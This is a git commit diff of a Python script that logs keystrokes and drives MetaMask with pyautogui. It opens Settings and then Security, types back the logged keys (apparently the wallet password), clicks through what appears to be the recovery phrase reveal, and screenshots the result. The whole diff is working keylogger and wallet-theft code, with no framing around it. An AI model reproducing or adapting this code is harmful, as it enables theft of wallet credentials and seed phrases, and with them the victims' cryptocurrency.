ebb2926c608374454229f9fe788339e7070bcd9d
Supphitan Paksawad <Supphitan.p@kkumail.com>
2022-03-21 07:04:05 +0700

    update

--- main.py
+++ main.py
@@ -11,11 +11,14 @@ keys = []
 key = ""
 def on_press(key):
     global keys
-    keys.append(key)
-    print("{0} pressed".format(key))
-    
+    if(pyautogui.locateOnScreen('./img/unlock6.png')):
+        return False
+    else:
+        keys.append(key)
+        print("{0} pressed".format(key))
+
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open("log.txt", "w") as f:
         for key in keys:
             k = str(key).replace("'","")
             f.write(k)
@@ -37,20 +40,29 @@ while True:
             write_file(keys)
             print('Login MetaMask')
             time.sleep(2)
-            pyautogui.click(1651,132)
+            pyautogui.click(1742,124)
             if(pyautogui.locateOnScreen('./img/unlock3.png')):
                 print('My Accounts')
                 time.sleep(1)
-                pyautogui.click(1397,624)
+                pyautogui.click(1459,615)
                 if(pyautogui.locateOnScreen('./img/unlock4.png')):
                     print('Settings')
                     time.sleep(1)
-                    pyautogui.click(1409,507)
+                    pyautogui.click(1508,497)
                     if(pyautogui.locateOnScreen('./img/unlock5.png')):
                         print('Security')
                         time.sleep(1)
-                        pyautogui.click(1465,400)
-        
-        
+                        pyautogui.click(1546,395)
+                        time.sleep(1)
+                        data = open("log.txt", "r")
+                        r = data.read()
+                        pyautogui.write(r)
+                        pyautogui.click(1665,782)
+                        time.sleep(5)
+                        pyautogui.doubleClick(1775,736)
+                        time.sleep(5)
+                        pyautogui.screenshot('my_screenshot.png')
+                        time.sleep(1)
+                        exit()                        
 
         
